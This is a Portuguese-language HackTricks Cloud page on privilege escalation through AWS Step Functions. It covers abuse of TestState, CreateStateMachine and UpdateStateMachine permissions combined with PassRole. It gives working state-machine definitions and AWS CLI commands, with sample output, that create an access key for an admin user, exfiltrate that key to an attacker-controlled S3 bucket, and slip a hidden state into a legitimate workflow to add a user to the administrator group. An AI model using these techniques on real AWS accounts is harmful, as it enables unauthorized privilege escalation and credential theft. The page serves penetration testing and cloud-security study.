# AWS - Escala√ß√£o de Privil√©gios em Step Functions

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## Step Functions

Para mais informa√ß√µes sobre este servi√ßo AWS, verifique:

{% content-ref url="../aws-services/aws-stepfunctions-enum.md" %}
[aws-stepfunctions-enum.md](../aws-services/aws-stepfunctions-enum.md)
{% endcontent-ref %}

### `states:TestState` & `iam:PassRole`

Um atacante com as permiss√µes **`states:TestState`** & **`iam:PassRole`** pode testar qualquer estado e passar qualquer fun√ß√£o IAM para ele sem criar ou atualizar uma m√°quina de estados existente, permitindo acesso n√£o autorizado a outros servi√ßos AWS com as permiss√µes das fun√ß√µes. Potencialmente, essas permiss√µes combinadas podem levar a a√ß√µes n√£o autorizadas extensivas, desde manipula√ß√£o de fluxos de trabalho para alterar dados at√© viola√ß√µes de dados, manipula√ß√£o de recursos e escalonamento de privil√©gios.
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
Os seguintes exemplos mostram como testar um estado que cria uma chave de acesso para o usu√°rio **`admin`** aproveitando essas permiss√µes e uma fun√ß√£o permissiva do ambiente AWS. Essa fun√ß√£o permissiva deve ter uma pol√≠tica de alto privil√©gio associada a ela (por exemplo **`arn:aws:iam::aws:policy/AdministratorAccess`**) que permite ao estado executar a a√ß√£o **`iam:CreateAccessKey`**:

- **stateDefinition.json**:
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
- **Comando** executado para realizar a escalada de privil√©gios:
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
- **Impacto Potencial**: Execu√ß√£o e manipula√ß√£o n√£o autorizadas de fluxos de trabalho e acesso a recursos sens√≠veis, potencialmente resultando em viola√ß√µes significativas de seguran√ßa.

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

Um atacante com as permiss√µes **`states:CreateStateMachine`** e **`iam:PassRole`** seria capaz de criar uma m√°quina de estado e atribuir a ela qualquer fun√ß√£o IAM, permitindo acesso n√£o autorizado a outros servi√ßos da AWS com as permiss√µes da fun√ß√£o. Em contraste com a t√©cnica de escalonamento de privil√©gios anterior (**`states:TestState`** & **`iam:PassRole`**), esta n√£o √© executada por si s√≥, sendo necess√°rio tamb√©m ter as permiss√µes **`states:StartExecution`** ou **`states:StartSyncExecution`** (**`states:StartSyncExecution`** n√£o est√° dispon√≠vel para fluxos de trabalho padr√£o, apenas para m√°quinas de estado expressas) para iniciar e executar a m√°quina de estado.
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
Os seguintes exemplos mostram como criar uma m√°quina de estados que cria uma chave de acesso para o usu√°rio **`admin`** e exfiltra essa chave de acesso para um bucket S3 controlado por um atacante, aproveitando essas permiss√µes e uma fun√ß√£o permissiva do ambiente AWS. Essa fun√ß√£o permissiva deve ter associada a ela uma pol√≠tica de alto privil√©gio (por exemplo **`arn:aws:iam::aws:policy/AdministratorAccess`**) que permite √† m√°quina de estados realizar as a√ß√µes **`iam:CreateAccessKey`** e **`s3:putObject`**.

- **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
- **Comando** executado para **criar a m√°quina de estados**:
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
- **Comando** executado para **iniciar uma execu√ß√£o** da m√°quina de estados previamente criada:
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
{% hint style="warning" %}

O bucket S3 controlado pelo atacante deve ter permiss√µes para aceitar uma a√ß√£o s3:PutObject da conta da v√≠tima.

{% endhint %}

- **Impacto Potencial**: Execu√ß√£o n√£o autorizada e manipula√ß√£o de fluxos de trabalho e acesso a recursos sens√≠veis, potencialmente levando a viola√ß√µes significativas de seguran√ßa.

### `states:UpdateStateMachine` & (nem sempre necess√°rio) `iam:PassRole`

Um atacante com permiss√£o **`states:UpdateStateMachine`** seria capaz de modificar a defini√ß√£o de uma m√°quina de estados, podendo adicionar estados extras furtivos que poderiam resultar em uma escalada de privil√©gios. Dessa forma, quando um usu√°rio leg√≠timo inicia uma execu√ß√£o da m√°quina de estados, esse novo estado furtivo malicioso ser√° executado e a escalada de privil√©gios ser√° bem-sucedida.

Dependendo de qu√£o permissiva √© a Fun√ß√£o IAM associada √† m√°quina de estados, um atacante enfrentaria 2 situa√ß√µes:

1. **Fun√ß√£o IAM Permissiva**: Se a Fun√ß√£o IAM associada √† m√°quina de estados j√° for permissiva (por exemplo, tem a pol√≠tica **`arn:aws:iam::aws:policy/AdministratorAccess`** anexada), ent√£o a permiss√£o **`iam:PassRole`** n√£o seria necess√°ria para escalar privil√©gios, pois n√£o seria necess√°rio atualizar tamb√©m a Fun√ß√£o IAM, apenas a defini√ß√£o da m√°quina de estados seria suficiente.
2. **Fun√ß√£o IAM N√£o Permissiva**: Em contraste com o caso anterior, aqui um atacante tamb√©m precisaria da permiss√£o **`iam:PassRole`**, pois seria necess√°rio associar uma Fun√ß√£o IAM permissiva √† m√°quina de estados, al√©m de modificar a defini√ß√£o da m√°quina de estados.
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
Os seguintes exemplos mostram como atualizar uma m√°quina de estado leg√≠tima que simplesmente invoca uma fun√ß√£o Lambda HelloWorld, a fim de adicionar um estado extra que adiciona o usu√°rio **`unprivilegedUser`** ao Grupo IAM **`administrator`**. Dessa forma, quando um usu√°rio leg√≠timo inicia uma execu√ß√£o da m√°quina de estado atualizada, este novo estado malicioso furtivo ser√° executado e a escalada de privil√©gios ser√° bem-sucedida.

{% hint style="warning" %}

Se a m√°quina de estado n√£o tiver uma fun√ß√£o IAM permissiva associada, tamb√©m seria necess√°rio a permiss√£o **`iam:PassRole`** para atualizar a Fun√ß√£o IAM a fim de associar uma fun√ß√£o IAM permissiva (por exemplo, uma com a pol√≠tica **`arn:aws:iam::aws:policy/AdministratorAccess`** anexada).

{% endhint %}

{% tabs %}

{% tab title="M√°quina de Estado Leg√≠tima" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% tab title="M√°quina de Estado Atualizada Maliciosa" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% endtabs %}

- **Comando** executado para **atualizar** **a m√°quina de estado leg√≠tima**:
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
- **Impacto Potencial**: Execu√ß√£o e manipula√ß√£o n√£o autorizadas de fluxos de trabalho e acesso a recursos sens√≠veis, potencialmente levando a viola√ß√µes de seguran√ßa significativas.

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
